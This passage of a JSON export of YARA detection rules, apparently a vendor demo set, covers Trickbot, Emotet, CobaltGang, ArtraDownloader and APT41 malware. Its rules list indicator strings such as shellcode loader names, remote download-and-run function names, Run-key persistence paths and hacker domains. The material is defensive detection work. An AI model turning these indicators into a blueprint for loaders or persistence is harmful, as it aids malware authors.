Research\"\n      date = \"2019-10-28 10:43:11\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $xo1 = \"Mozilla/5.0\" xor ascii wide\n      $xof1 = \"Mozilla/5.0\" ascii wide\n   condition: \n      $xo1 and not $xof1\n}","date":"2019-10-28 10:43:11","description":"Detects suspicious XORed keyword - Mozilla/5.0","minimum_yara":"1.7","name":"SUSP_XORed_Mozilla_RID2DB4","reference":"Internal Research","required_modules":[],"rule_hash":"778b46be1223246a37b2f0ac5249c60c","score":65,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule MAL_CRIME_CobaltGang_Malware_Oct19_1_RID3392 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects CobaltGang malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/vxsh4d0w/status/1187353649015611392\"\n      date = \"2019-10-24 14:53:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op_a1 = { 0f 44 c2 eb 0a 31 c0 80 fa 20 0f 94 c0 01 c0 5d } \n      $op_b1 = { 89 e5 53 8b 55 08 8b 4d 0c 8a 1c 01 88 1c 02 83 } \n      $op_b2 = { 89 e5 53 8b 55 08 8b 45 0c 8a 1c 0a 88 1c 08 83 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize <= 2000KB and ( pe.imphash ( ) == \"d1e3f8d02cce09520379e5c1e72f862f\" or pe.imphash ( ) == \"8e26df99c70f79cb8b1ea2ef6f8e52ac\" or ( $op_a1 and 1 of ( $op_b* ) ) )\n}","date":"2019-10-24 14:53:31","description":"Detects CobaltGang malware","minimum_yara":"1.7","name":"MAL_CRIME_CobaltGang_Malware_Oct19_1_RID3392","reference":"https://twitter.com/vxsh4d0w/status/1187353649015611392","required_modules":["pe"],"rule_hash":"740cd7efe7f3486f23417c89288dd1d7","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule SUSP_TINY_PE_RID2AF3 : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects Tiny PE file\"\n      author = \"Florian Roth\"\n      reference = \"https://webserver2.tecgraf.puc-rio.br/~ismael/Cursos/YC++/apostilas/win32_xcoff_pe/tyne-example/Tiny%20PE.htm\"\n      date = \"2019-10-23 09:36:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $header = { 4D 5A 00 00 50 45 00 00 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and uint16 ( 4 ) == 0x4550 and filesize <= 20KB and $header at 0\n}","date":"2019-10-23 09:36:41","description":"Detects Tiny PE file","minimum_yara":"1.7","name":"SUSP_TINY_PE_RID2AF3","reference":"https://webserver2.tecgraf.puc-rio.br/~ismael/Cursos/YC++/apostilas/win32_xcoff_pe/tyne-example/Tiny%20PE.htm","required_modules":[],"rule_hash":"772154cc2caf799c9c5c90aa0c42ede3","score":80,"tags":["SUSP","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule SUSP_WER_Critical_HeapCorruption_RID3345 : DEMO FILE SUSP {\n   meta:\n      description = \"Detects a crashed application that crashed due to a heap corruption error (could be a sign of exploitation)\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyb3rops/status/1185459425710092288\"\n      date = \"2019-10-18 14:40:41\"\n      score = 45\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"ReportIdentifier=\" wide\n      $a2 = \".Name=Fault Module Name\" wide\n      $s1 = \"c0000374\" wide\n   condition: \n      ( uint32be ( 0 ) == 0x56006500 or uint32be ( 0 ) == 0xfffe5600 ) and all of them\n}","date":"2019-10-18 14:40:41","description":"Detects a crashed application that crashed due to a heap corruption error (could be a sign of exploitation)","minimum_yara":"1.7","name":"SUSP_WER_Critical_HeapCorruption_RID3345","reference":"https://twitter.com/cyb3rops/status/1185459425710092288","required_modules":[],"rule_hash":"aa166b483646974b8e62e089acc8bcc0","score":45,"tags":["SUSP","DEMO","FILE"]},{"author":"Florian Roth","content":"rule SUSP_PDB_Path_Keywords_RID2F34 : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects suspicious PDB paths\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/stvemillertime/status/1179832666285326337?s=20\"\n      date = \"2019-10-04 11:47:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = \"Debug\\\\Shellcode\" ascii\n      $ = \"Release\\\\Shellcode\" ascii\n      $ = \"Debug\\\\ShellCode\" ascii\n      $ = \"Release\\\\ShellCode\" ascii\n      $ = \"Debug\\\\shellcode\" ascii\n      $ = \"Release\\\\shellcode\" ascii\n      $ = \"shellcode.pdb\" nocase ascii\n      $ = \"\\\\ShellcodeLauncher\" ascii\n      $ = \"\\\\ShellCodeLauncher\" ascii\n      $ = \"Fucker.pdb\" ascii\n      $ = \"\\\\AVFucker\\\\\" ascii\n      $ = \"ratTest.pdb\" ascii\n      $ = \"Debug\\\\CVE_\" ascii\n      $ = \"Release\\\\CVE_\" ascii\n      $ = \"Debug\\\\cve_\" ascii\n      $ = \"Release\\\\cve_\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and 1 of them\n}","date":"2019-10-04 11:47:11","description":"Detects suspicious PDB paths","minimum_yara":"1.7","name":"SUSP_PDB_Path_Keywords_RID2F34","reference":"https://twitter.com/stvemillertime/status/1179832666285326337?s=20","required_modules":[],"rule_hash":"24a8907f6a7cb907b417e2291239bf3c","score":75,"tags":["SUSP","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule MAL_Emotet_JS_Dropper_Oct19_1_RID316E : DEMO FILE MAL {\n   meta:\n      description = \"Detects Emotet JS dropper\"\n      author = \"Florian Roth\"\n      reference = \"https://app.any.run/tasks/aaa75105-dc85-48ca-9732-085b2ceeb6eb/\"\n      date = \"2019-10-03 13:22:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $xc1 = { FF FE 76 00 61 00 72 00 20 00 61 00 3D 00 5B 00\n               27 00 } \n   condition: \n      uint32 ( 0 ) == 0x0076feff and filesize <= 700KB and $xc1 at 0\n}","date":"2019-10-03 13:22:11","description":"Detects Emotet JS dropper","minimum_yara":"1.7","name":"MAL_Emotet_JS_Dropper_Oct19_1_RID316E","reference":"https://app.any.run/tasks/aaa75105-dc85-48ca-9732-085b2ceeb6eb/","required_modules":[],"rule_hash":"d98871202ea88e1a7c0ad7b3df9c0940","score":75,"tags":["DEMO","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_Trickbot_Malware_Oct19_2_RID3134 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Trickbot malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-10-02 13:12:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"C:\\\\Users\\\\User\\\\Desktop\\\\Encrypt\\\\Math_Cad\\\\Release\\\\Math_Cad.pdb\" fullword ascii\n      $x2 = \"AxedWV3OVTFfnGb\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize <= 2000KB and 1 of them\n}","date":"2019-10-02 13:12:31","description":"Detects Trickbot malware","minimum_yara":"1.7","name":"MAL_Trickbot_Malware_Oct19_2_RID3134","reference":"Internal Research","required_modules":[],"rule_hash":"910b197146f5680ff6e8f499d64ce7f4","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_Trickbot_Malware_Oct19_3_RID3135 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Trickbot malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-10-02 13:12:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Decrypt Shell Fail\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize <= 2000KB and ( 1 of them or pe.imphash ( ) == \"4e3fbfbf1fc23f646cd40a6fe09385a7\" )\n}","date":"2019-10-02 13:12:41","description":"Detects Trickbot malware","minimum_yara":"1.7","name":"MAL_Trickbot_Malware_Oct19_3_RID3135","reference":"Internal Research","required_modules":["pe"],"rule_hash":"5b6a4050569a8b0250ac40c6d8aba757","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_Trickbot_Malware_Oct19_5_RID3137 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Trickbot malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-10-02 13:13:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"LoadShellCode\" fullword ascii\n      $s2 = \"pShellCode\" fullword ascii\n      $s3 = \"InitShellCode\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize <= 2000KB and 2 of them\n}","date":"2019-10-02 13:13:01","description":"Detects Trickbot malware","minimum_yara":"1.7","name":"MAL_Trickbot_Malware_Oct19_5_RID3137","reference":"Internal Research","required_modules":[],"rule_hash":"58b96e161d49f0542a77f16bfc7122ce","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_Trickbot_Malware_Oct19_1_RID3133 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Trickbot malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-10-02 13:12:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Celestor@hotmail.com\" fullword ascii\n      $s2 = \"\\\\txtPassword\" fullword ascii\n      $s14 = \"Invalid Password, try again!\" fullword wide\n      $op1 = { 78 c4 40 00 ff ff ff ff b4 47 41 } \n      $op2 = { 9b 68 b2 34 46 00 eb 14 8d 55 e4 8d 45 e8 52 50 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize <= 2000KB and 3 of them\n}","date":"2019-10-02 13:12:21","description":"Detects Trickbot malware","minimum_yara":"1.7","name":"MAL_Trickbot_Malware_Oct19_1_RID3133","reference":"Internal Research","required_modules":[],"rule_hash":"73f616b1ab8d80e59c24b1e304e36219","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_Trickbot_Malware_Oct19_4_RID3136 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Trickbot malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-10-02 13:12:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"c:\\\\users\\\\user\\\\documents\\\\visual studio 2005\\\\projects\\\\adzxser\\\\release\\\\ADZXSER.pdb\" fullword ascii\n      $x2 = \"http://root-hack.org\" fullword ascii\n      $x3 = \"http://hax-studios.net\" fullword ascii\n      $x4 = \"5OCFBBKCAZxWUE#$_SVRR[SQJ\" fullword ascii\n      $x5 = \"G*\\\\AC:\\\\Users\\\\911\\\\Desktop\\\\cButtonBar\\\\cButtonBar\\\\ButtonBar.vbp\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize <= 2000KB and 1 of them\n}","date":"2019-10-02 13:12:51","description":"Detects Trickbot malware","minimum_yara":"1.7","name":"MAL_Trickbot_Malware_Oct19_4_RID3136","reference":"Internal Research","required_modules":[],"rule_hash":"6fd83ca325991bb0074050750581c93c","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_Trickbot_Malware_Oct19_6_RID3138 : DEMO EXE FILE MAL T1060 {\n   meta:\n      description = \"Detects Trickbot malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-10-02 13:13:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1060\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"D:\\\\MyProjects\\\\spreader\\\\Release\\\\ssExecutor_x86.pdb\" fullword ascii\n      $s1 = \"%s\\\\appdata\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\%s\" fullword ascii\n      $s2 = \"%s\\\\appdata\\\\roaming\\\\%s\" fullword ascii\n      $s3 = \"WINDOWS\\\\SYSTEM32\\\\TASKS\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize <= 400KB and ( 1 of ( $x* ) or 3 of them )\n}","date":"2019-10-02 13:13:11","description":"Detects Trickbot malware","minimum_yara":"1.7","name":"MAL_Trickbot_Malware_Oct19_6_RID3138","reference":"Internal Research","required_modules":[],"rule_hash":"462199f63cbf6c143a6e97debf468ac3","score":75,"tags":["DEMO","EXE","T1060","FILE","MAL"]},{"author":"Florian Roth","content":"rule SUSP_Unsigned_OSPPSVC_RID2E85 : DEMO EXE FILE SUSP T1035 {\n   meta:\n      description = \"Detects a suspicious unsigned office software protection platform service binary\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2019/09/24/no-summer-vacations-zebrocy/\"\n      date = \"2019-09-26 11:18:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, SUSP, T1035\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sc1 = { 00 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63\n               00 72 00 69 00 70 00 74 00 69 00 6F 00 6E 00 00\n               00 00 00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F\n               00 66 00 74 00 20 00 4F 00 66 00 66 00 69 00 63\n               00 65 00 20 00 53 00 6F 00 66 00 74 00 77 00 61\n               00 72 00 65 00 20 00 50 00 72 00 6F 00 74 00 65\n               00 63 00 74 00 69 00 6F 00 6E 00 20 00 50 00 6C\n               00 61 00 74 00 66 00 6F 00 72 00 6D 00 20 00 53\n               00 65 00 72 00 76 00 69 00 63 00 65 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 8000KB and $sc1 and pe.number_of_signatures < 1\n}","date":"2019-09-26 11:18:01","description":"Detects a suspicious unsigned office software protection platform service binary","minimum_yara":"1.7","name":"SUSP_Unsigned_OSPPSVC_RID2E85","reference":"https://www.welivesecurity.com/2019/09/24/no-summer-vacations-zebrocy/","required_modules":["pe"],"rule_hash":"c85d7a524f4673610697e745574f6365","score":70,"tags":["SUSP","DEMO","EXE","T1035","FILE"]},{"author":"Florian Roth","content":"rule MAL_ArtraDownloader2_Aug19_1_RID30FB : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects ArtraDownloader malware\"\n      author = \"Florian Roth\"\n      reference = \"https://unit42.paloaltonetworks.com/multiple-artradownloader-variants-used-by-bitter-to-target-pakistan/\"\n      date = \"2019-08-27 13:03:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $xc1 = { 47 45 54 20 25 73 20 48 54 54 50 2F 31 2E 30 00\n               0D 0A 00 00 48 6F 73 74 3A 20 25 73 00 00 00 00\n               3F 61 3D 00 26 62 3D 00 26 63 3D 00 26 64 3D 00\n               26 65 3D 00 25 32 30 } \n      $xc2 = { 25 73 20 25 73 20 25 73 0D 0A 25 73 20 25 73 0D\n               0A 25 73 25 73 0D 0A 25 73 25 73 0D 0A 25 73 20\n               25 64 0D 0A 0D 0A 25 73 00 00 00 00 71 72 79 3D } \n      $xc3 = { 49 44 3D 25 73 00 00 00 3A 00 00 00 25 73 20 25\n               73 20 25 73 0D 0A 25 73 20 25 73 0D 0A 25 73 25\n               73 0D 0A 25 73 25 73 0D 0A 43 6F 6E 74 65 6E 74\n               2D 6C 65 6E 67 74 68 25 73 20 25 64 } \n      $xc4 = { 25 73 20 25 73 20 25 73 0D 0A 25 73 20 25 73 0D\n               0A 25 73 25 73 0D 0A 25 73 25 73 0D 0A 43 6F 6E\n               74 65 6E 74 2D 6C 65 6E 67 74 68 3A 20 25 64 0D\n               0A 0D 0A 25 73 } \n      $x1 = \"Tpguxbsf]Njdsptpgu\" ascii\n      $x2 = \".gpsn.vsmfodpefe\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them\n}","date":"2019-08-27 13:03:01","description":"Detects ArtraDownloader malware","minimum_yara":"1.7","name":"MAL_ArtraDownloader2_Aug19_1_RID30FB","reference":"https://unit42.paloaltonetworks.com/multiple-artradownloader-variants-used-by-bitter-to-target-pakistan/","required_modules":[],"rule_hash":"a875ca3c0f72ba342bc1ab177d57ce7b","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT_APT41_POISONPLUG_3_RID2DA0 : APT DEMO EXE FILE T1085 {\n   meta:\n      description = \"Detects APT41 malware POISONPLUG\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html\"\n      date = \"2019-08-07 10:39:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Rundll32.exe \\\"%s\\\", DisPlay 64\" fullword ascii\n      $s2 = \"tcpview.exe\" fullword ascii\n      $s3 = \"nuR\\\\noisreVtnerruC\\\\swodniW\\\\tfosorciM\\\\erawtfoS\" fullword ascii\n      $s4 = \"AxEeulaVteSgeR\" fullword ascii\n      $s5 = \"%04d-%02d-%02d_%02d-%02d-%02d.dmp\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and 3 of them\n}","date":"2019-08-07 10:39:51","description":"Detects APT41 malware POISONPLUG","minimum_yara":"1.7","name":"APT_APT41_POISONPLUG_3_RID2DA0","reference":"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html","required_modules":[],"rule_hash":"7affc4b0c5c310907ced731427a62428","score":75,"tags":["APT","T1085","EXE","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_APT41_POISONPLUG_SHADOW_RID2F33 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects APT41 malware POISONPLUG SHADOW\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html\"\n      date = \"2019-08-07 11:47:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and pe.imphash ( ) == \"c67de089f2009b21715744762fc484e8\"\n}","date":"2019-08-07 11:47:01","description":"Detects APT41 malware POISONPLUG SHADOW","minimum_yara":"1.7","name":"APT_APT41_POISONPLUG_SHADOW_RID2F33","reference":"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html","required_modules":["pe"],"rule_hash":"4bd89c4dc6a2d9d10cc6c39a156ec3b3","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_APT41_CRACKSHOT_RID2CA0 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects APT41 malware CRACKSHOT\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html\"\n      date = \"2019-08-07 09:57:11\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \";procmon64.exe;netmon.exe;tcpview.exe;MiniSniffer.exe;smsniff.exe\" ascii\n      $s1 = \"RunUrlBinInMem\" fullword ascii\n      $s2 = \"DownRunUrlFile\" fullword ascii\n      $s3 = \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36\" fullword ascii\n      $s4 = \"%s|%s|%s|%s|%s|%s|%s|%dx%d|%04x|%08X|%s|%s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and ( 1 of ( $x* ) or 2 of them )\n}","date":"2019-08-07 09:57:11","description":"Detects APT41 malware CRACKSHOT","minimum_yara":"1.7","name":"APT_APT41_CRACKSHOT_RID2CA0","reference":"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html","required_modules":[],"rule_hash":"6610193e423dc3799df0848bcd0eb8b7","score":85,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_APT41_POISONPLUG_2_RID2D9F : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects APT41 malware POISONPLUG\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html\"\n      date = \"2019-08-07 10:39:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ma_lockdown_service.dll\" fullword wide\n      $s2 = \"acbde.dll\" fullword ascii\n      $s3 = \"MA lockdown Service\" fullword wide\n      $s4 = \"McAfee Agent\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 11000KB and all of them\n}","date":"2019-08-07 10:39:41","description":"Detects APT41 malware POISONPLUG","minimum_yara":"1.7","name":"APT_APT41_POISONPLUG_2_RID2D9F","reference":"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html","required_modules":[],"rule_hash":"29d8a9fbdac36c678dba5eba018fecd3","score":70,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_APT41_POISONPLUG_RID2D0E : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects APT41 malware POISONPLUG\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html\"\n      date = \"2019-08-07 10:15:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"TSMSISrv.DLL\" fullword wide\n      $s2 = \"[-]write failed[%d]\" fullword ascii\n      $s3 = \"[-]load failed\" fullword ascii\n      $s4 = \"Remote Desktop Services\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and ( pe.imphash ( ) == \"1b074ef7a1c0888ef31337c8ad2f2e0a\" or 2 of them )\n}","date":"2019-08-07 10:15:31","description":"Detects APT41 malware POISONPLUG","minimum_yara":"1.7","name":"APT_APT41_POISONPLUG_RID2D0E","reference":"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html","required_modules":["pe"],"rule_hash":"0b11c5a8dce705d97a342c7a516913be","score":80,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_APT41_HIGHNOON_RID2C58 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects APT41 malware HIGHNOON\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html\"\n      date = \"2019-08-07 09:45:11\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"workdll64.dll\" fullword ascii\n      $s1 = \"\\\\Fonts\\\\Error.log\" fullword ascii\n      $s2 = \"[%d/%d/%d/%d:%d:%d]\" fullword ascii\n      $s3 = \"work_end\" fullword ascii\n      $s4 = \"work_start\" fullword ascii\n      $s5 = \"\\\\svchost.exe\" fullword ascii\n      $s6 = \"LoadAppInit_DLLs\" fullword ascii\n      $s7 = \"netsvcs\" fullword ascii\n      $s8 = \"HookAPIs ...PID %d \" fullword ascii\n      $s9 = \"SOFTWARE\\\\Microsoft\\\\HTMLHelp\" fullword ascii\n      $s0 = \"DllMain_mem\" fullword ascii\n      $s10 = \"%s\\\\NtKlRes.dat\" fullword ascii\n      $s11 = \"Global\\\\%s-%d\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 1 of ( $x* ) or 4 of them )\n}","date":"2019-08-07 09:45:11","description":"Detects APT41 malware HIGHNOON","minimum_yara":"1.7","name":"APT_APT41_HIGHNOON_RID2C58","reference":"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html","required_modules":[],"rule_hash":"68f9d62b90ccce16ebc501224db2d61e","score":85,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_APT41_HIGHNOON_2_RID2CE9 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects APT41 malware HIGHNOON\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html\"\n      date = \"2019-08-07 10:09:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"H:\\\\RBDoor\\\\\" ascii\n      $s1 = \"PlusDll.dll\" fullword ascii\n      $s2 = \"ShutDownEvent.dll\" fullword ascii\n      $s3 = \"\\\\svchost.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( pe.imphash ( ) == \"b70358b00dd0138566ac940d0da26a03\" or pe.exports ( \"DllMain_mem\" ) or $x1 or 3 of them )\n}","date":"2019-08-07 10:09:21","description":"Detects APT41 malware HIGHNOON","minimum_yara":"1.7","name":"APT_APT41_HIGHNOON_2_RID2CE9","reference":"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html","required_modules":["pe"],"rule_hash":"fecc93c2f70540f55679ecc2bc9dd3ff","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_APT41_HIGHNOON_BIN_RID2D90 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects APT41 malware HIGHNOON.BIN\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html\"\n      date = \"2019-08-07 10:37:11\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"PlusDll.dll\" fullword ascii\n      $s2 = \"\\\\Device\\\\PORTLESS_DeviceName\" fullword wide\n      $s3 = \"%s%s\\\\Security\" fullword ascii\n      $s4 = \"%s\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\" fullword ascii\n      $s5 = \"%s%s\\\\Enum\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 